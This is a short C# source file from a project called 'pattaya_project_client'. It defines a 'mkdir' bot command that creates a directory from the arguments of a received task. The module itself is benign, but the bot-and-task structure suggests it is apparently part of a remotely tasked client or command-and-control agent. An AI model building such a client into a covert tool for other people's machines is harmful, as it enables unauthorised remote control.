using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System.IO;


namespace pattaya_project_client.Commands.Implements
{
    public class CreateDirectory : BotCommand
    {
        public override string TaskName => "mkdir";

        public override string RunTask(BotTask task)
        {
            string path;
            var arguments = task.Arguments.Split(' ');
            if (arguments is null || arguments.Length == 0)
            {
                return "No path provided";
            }
            else
            {
                path = arguments[0];
            }

            var dirInfo = Directory.CreateDirectory(path);
            return $"{dirInfo.FullName} created";
        }
    }
}
